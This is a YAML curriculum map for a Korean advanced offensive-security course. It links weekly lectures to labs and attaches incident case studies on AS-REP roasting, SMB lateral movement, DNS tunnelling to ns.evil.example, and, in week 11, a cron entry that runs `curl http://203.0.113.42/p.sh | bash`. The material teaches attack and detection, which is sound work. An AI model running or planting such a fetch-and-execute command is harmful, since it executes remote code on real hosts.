# contents/curriculum/attack-adv-mapping.yaml
course_id: attack-adv
notes: |
  attack-adv lecture/lab 거의 완전 정렬 (APT 킬체인 순서 동일). Precinct 6 의 5건
  chain 이 attack-adv 의 학습 단계와 거의 1:1 대응 — case_study 풍부.

mappings:
  - week: 1
    lecture: {course: course13-attack-advanced, title: "APT 킬체인 심화"}
    labs:
      - {course: attack-adv, week: 1, version: nonai, role: primary, note: "APT 킬체인 분석"}
      - {course: attack-adv, week: 1, version: ai, role: primary}
  - week: 2
    lecture: {course: course13-attack-advanced, title: "OSINT 고급"}
    labs:
      - {course: attack-adv, week: 2, version: nonai, role: primary, note: "OSINT 고급"}
  - week: 3
    lecture: {course: course13-attack-advanced, title: "네트워크 우회 — 방화벽/IDS 회피"}
    labs:
      - {course: attack-adv, week: 3, version: nonai, role: primary, note: "네트워크 우회 기법"}
  - week: 4
    lecture: {course: course13-attack-advanced, title: "웹 고급 — SSRF/XXE/디시리얼라이제이션"}
    labs:
      - {course: attack-adv, week: 4, version: nonai, role: primary, note: "웹 고급 (SSRF/XXE)"}
      - {course: web-vuln, week: 7, version: nonai, role: bonus, note: "SSRF (cross)"}
      - {course: web-vuln, week: 9, version: nonai, role: bonus, note: "Insecure Deserialization (cross)"}
  - week: 5
    lecture: {course: course13-attack-advanced, title: "인증 공격 — Kerberoasting/AS-REP/토큰"}
    labs:
      - {course: attack-adv, week: 5, version: nonai, role: primary, note: "인증 공격 (Kerberos/NTLM)"}
    case_study:
      title: "AS-REP roasting — krbtgt 외부 유출"
      narrative: |
        2024-08-15 11:02 win-dc01 의 PreAuthFlag=False 계정 3건 식별, AS-REP
        응답이 외부 IP 198.51.100.42 로 전송. 16분간 지속. 공격자는 hash
        획득 후 오프라인 brute force 후 Golden Ticket 진행 가능 상태였음.
      mitre: ["T1558.004"]
      anchor_id: anc-7c9fb0248f47
      relevance: "Kerberoasting/AS-REP 강의의 *진짜 사례*. impacket-GetNPUsers
                 도구 결과와 비교 가능."
      source: "Precinct 6 incident-2024-08-002"
  - week: 6
    lecture: {course: course13-attack-advanced, title: "권한 상승 체인"}
    labs:
      - {course: attack-adv, week: 6, version: nonai, role: primary, note: "권한 상승 체인"}
      - {course: attack, week: 8, version: nonai, role: bonus, note: "PrivEsc 기초 (cross)"}
  - week: 7
    lecture: {course: course13-attack-advanced, title: "C2 인프라"}
    labs:
      - {course: attack-adv, week: 7, version: nonai, role: primary, note: "C2 인프라 운영"}
  - week: 8
    lecture: {course: course13-attack-advanced, title: "측면 이동 — PtH/WMI/PSExec"}
    labs:
      - {course: attack-adv, week: 8, version: nonai, role: primary, note: "측면 이동"}
    case_study:
      title: "SMB 측면이동 — 단일 자격으로 5호스트"
      narrative: |
        2024-08-12 03:14 ~ 03:42, 28분간 john.doe 계정으로 10.20.30.50 →
        {60,70,80,90,100} SMB 인증 성공. 동일 자격증명 재사용 패턴
        (T1078). 단일 정상 자격으로 다중 호스트 접근.
      mitre: ["T1021.002", "T1078"]
      anchor_id: anc-eca1db9a5a31
      relevance: "PtH 강의의 *실측*. impacket-psexec 또는 crackmapexec smb 와
                 동일 트래픽 패턴."
      source: "Precinct 6 incident-2024-08-001"
  - week: 9
    lecture: {course: course13-attack-advanced, title: "Active Directory — BloodHound/DCSync/Golden"}
    labs:
      - {course: attack-adv, week: 9, version: nonai, role: primary, note: "AD 공격"}
      - {course: attack-adv, week: 5, version: nonai, role: bonus, note: "Kerberos/NTLM (cross w5)"}
  - week: 10
    lecture: {course: course13-attack-advanced, title: "데이터 유출 — DNS/스테가노/암호화 채널"}
    labs:
      - {course: attack-adv, week: 10, version: nonai, role: primary, note: "데이터 유출"}
    case_study:
      title: "DNS 터널링 base32 — 1,247건 2시간 25분"
      narrative: |
        2024-08-22 22:47, 10.20.30.80 → ns.evil.example, base32 인코딩 subdomain
        1,247건. 평균 8.5건/분 (안정적 송출). UDP/53 정상 트래픽 뒤 숨어
        IDS·방화벽 통과. 학생은 dnscat2 / iodine 으로 동일 패턴 재현.
      mitre: ["T1071.004", "T1048.003"]
      anchor_id: anc-3564198ef1bc
      relevance: "데이터 유출 강의의 *DNS exfil 표준 사례*. 학생이 도구 사용 후 원본 PCAP 비교."
      source: "Precinct 6 incident-2024-08-003"
  - week: 11
    lecture: {course: course13-attack-advanced, title: "안티포렌식 — 로그 삭제/타임스탬프/메모리"}
    labs:
      - {course: attack-adv, week: 11, version: nonai, role: primary, note: "안티포렌식"}
    case_study:
      title: "Linux cron + curl downloader — 메모리 전용 실행"
      narrative: |
        2024-08-25 침해 호스트의 /etc/cron.d/ 에 매 5분 실행 entry: `curl
        http://203.0.113.42/p.sh | bash`. 디스크에 페이로드 *영구 저장 X*.
        cron entry 자체만 흔적이고 실행 페이로드는 매번 새로 다운로드 →
        파일 해시 기반 AV·IOC 무효.
      mitre: ["T1053.003", "T1105"]
      anchor_id: anc-bf23b0106fe4
      relevance: "안티포렌식 강의의 *fileless 실행* 패턴. memory-only 가 어떻게 detection 회피하는지 실측."
      source: "Precinct 6 incident-2024-08-005"
  - week: 12
    lecture: {course: course13-attack-advanced, title: "공급망 공격"}
    labs:
      - {course: attack-adv, week: 12, version: nonai, role: primary, note: "공급망 공격"}
  - week: 13
    lecture: {course: course13-attack-advanced, title: "클라우드 공격 — IAM/Metadata/S3"}
    labs:
      - {course: attack-adv, week: 13, version: nonai, role: primary, note: "클라우드 공격"}
      - {course: cloud-container, week: 6, version: nonai, role: bonus, note: "IAM 접근 제어 (cross)"}
  - week: 14
    lecture: {course: course13-attack-advanced, title: "종합 모의해킹 — PTES"}
    labs:
      - {course: attack-adv, week: 14, version: nonai, role: primary, note: "종합 모의해킹"}
      - {course: attack-adv, week: 14, version: ai, role: primary}
  - week: 15
    lecture: {course: course13-attack-advanced, title: "보고서 + 윤리"}
    labs:
      - {course: attack-adv, week: 15, version: nonai, role: primary, note: "모의해킹 보고서"}
      - {course: attack-adv, week: 15, version: ai, role: primary}
